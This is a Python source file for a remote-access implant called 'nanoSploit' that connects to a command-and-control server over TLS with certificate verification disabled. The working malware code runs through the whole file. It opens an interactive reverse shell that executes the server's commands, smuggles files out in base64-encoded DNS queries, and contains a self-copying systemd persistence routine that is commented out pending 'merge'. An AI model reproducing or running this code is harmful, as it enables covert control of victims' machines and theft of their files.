import socket
import ssl
import subprocess
import os
import platform
import struct
from base64 import b64encode

# Static globals
SYSTEM = platform.system()
LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit.lock"
SYSTEMD_UNIT = """[Unit]
Description=nanoSploit
After=network.target

[Service]
ExecStart={0}/.nanosploit
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
"""


''' DNS SEND '''


def get_file(file_path) -> bytes | None:
    try:
        with open(file_path, 'rb') as file:
            return file.read()
    except FileNotFoundError:
        print("File not found")
        return None
    except:
        print("Error while attempting to read file")
        return None


def send_chunk(domain, server, port) -> str:
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    # DNS query header
    request_id = 1234
    flags = 0x0100
    qdcount = 1
    header = struct.pack('!HHHHHH', request_id, flags, qdcount, 0, 0, 0)

    # DNS question section
    question = b''
    domain_parts = domain.split('.')
    for part in domain_parts:
        length = len(part)
        question += struct.pack('!B{}s'.format(length), length, part.encode())
    question += b'\x00'
    question_type = 1
    question_class = 1
    question += struct.pack('!HH', question_type, question_class)

    # Construct the complete DNS request packet
    request = header + question

    try:
        # Send DNS request
        sock.sendto(request, (server, port))

        # Receive DNS response
        data, addr = sock.recvfrom(1024)

        # Extract the IP address from the response packet
        ip_address = socket.inet_ntoa(data[-4:])

        return ip_address

    except socket.timeout:
        print("DNS request timed out.")

    finally:
        # Close the socket
        sock.close()


def split_into_chunks(content) -> list[str]:
    chunks = []
    domain = ".file"
    chunk_length = 47-len(domain)
    for i in range(0, len(content), chunk_length):
        chunk = content[i:i+chunk_length]
        chunk = b64encode(chunk).decode()+domain
        chunks.append(chunk)
    return chunks


def dns_send(file_path) -> bool:
    content = get_file(file_path)
    if not content:
        return False

    chunks = split_into_chunks(content)
    for chunk in chunks:
        # Send each chunk in a DNS query
        answer = send_chunk(chunk, HOST, 5353)
        if answer == "2.2.2.2":
            print(f"Failed sending chunk '{chunk}'")

    return True


''' PERSISTENCE '''


def check_lock() -> bool:
    # Check if the lock file exists
    if os.path.isfile(LOCK_PATH):
        # Get PID from lock file
        with open(LOCK_PATH, 'r') as file:
            pid = file.read().strip()

        # Check if PID is running
        if SYSTEM == 'Windows':
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(1, False, int(pid))
            if handle != 0:
                # PID is running
                return True
        elif SYSTEM == "Linux":
            if os.path.exists(f"/proc/{pid}"):
                # PID is running
                return True

    # Create the lock file and write the current PID
    with open(LOCK_PATH, 'w') as file:
        file.write(str(os.getpid()))

    return False


def systemd_service(home_path: str):
    user_service_path = f"{home_path}/.config/systemd/user"

    # Creat systemd service directory
    if not os.path.exists(user_service_path):
        os.makedirs(user_service_path)

    # Write service file
    with open(f"{user_service_path}/nanosploit.service", "w") as f:
        f.write(SYSTEMD_UNIT.format(home_path))

    os.system("systemctl --user enable nanosploit")
    os.system("systemctl --user start nanosploit")

    print("Successfully set systemd service !")


def persistence_linux():
    home_path = os.getenv("HOME")
    payload_path = f"{home_path}/.nanosploit"

    if not os.path.exists(payload_path):
        os.system(f"cp {__file__} {payload_path}")

    # Run persistence
    systemd_service(home_path)


def persistence_windows():
    pass


''' REVERSE SHELL '''


def reverse_shell(ss: ssl.SSLSocket):
    while True:
        # Send 'user:cwd' to server for prompt
        ss.send(b":".join((os.getlogin().encode(), os.getcwd().encode())))

        buffer = ss.recv()
        if buffer:
            # Get command from server
            buffer_arr = buffer.decode().split(" ")

            match buffer_arr[0]:
                case "cd":
                    # Change current directory
                    if len(buffer_arr) < 2:
                        ss.send(b"Missing argument")
                    else:
                        try:
                            os.chdir(buffer_arr[1])
                            ss.send(f"Moved to '{buffer_arr[1]}'".encode())
                        except Exception as e:
                            ss.send(str(e).encode())
                case "exit":
                    # Exit reverse shell
                    break
                case _:
                    # Execute command
                    output = subprocess.run(buffer.decode(), shell=True, capture_output=True, text=True)
                    ss.send(output.stdout.encode() + output.stderr.encode())


''' SECURE SOCKET '''


def init_connection() -> ssl.SSLSocket:
    # Create socket with ssl
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ss = context.wrap_socket(s)

    # Connect to C2 server
    global HOST, PORT
    if "HOST" not in globals() and "PORT" not in globals():
        HOST, PORT = "127.0.0.1", 8000
    ss.connect((HOST, PORT))

    return ss


def process_instructions(ss: ssl.SSLSocket):
    while True:
        buffer = ss.recv()
        if buffer:
            print(buffer.decode())
            buffer1 = buffer.split(b" ")[0]
            match buffer1:
                case b"ping":
                    ss.send(b"pong")
                case b"shell":
                    reverse_shell(ss)
                case b"persistence":
                    # TODO: return persistence status
                    pass
                case b"exists":
                    if os.path.isfile(buffer.split(b" ")[1]):
                        ss.send(b"ok")
                    else:
                        ss.send(b"ko")
                case b"send":
                    if dns_send(buffer.split(b" ")[1]):
                        ss.send(b"ok")
                    else:
                        ss.send(b"ko")
                case _:
                    print(f"Unknown command received: '{buffer.decode()}'")
                    ss.send(b"unknown")
        else:
            print("Lost server connection, exiting...")
            break


''' MAIN '''


def main():
    # Exit if already running
    if check_lock():
        print("Already running, exiting...")
        return
    print("Lock is free !")

    # Persistence (TODO: uncomment this before merge)
    # print("Start persistence...")
    # if platform.system() == "Linux":
    #     persistence_linux()
    # elif platform.system() == "Windows":
    #     persistence_windows()
    # print("Finished persistence !")

    # Start secure connection with C2
    ss = init_connection()
    print("Successfully connected to C2 server !")

    # Handle server commands
    print("Start listening for server instructions...")
    process_instructions(ss)

    # Exit program and delete lock file
    os.system(f"rm {LOCK_PATH}")
    exit(0)


if __name__ == "__main__":
    main()
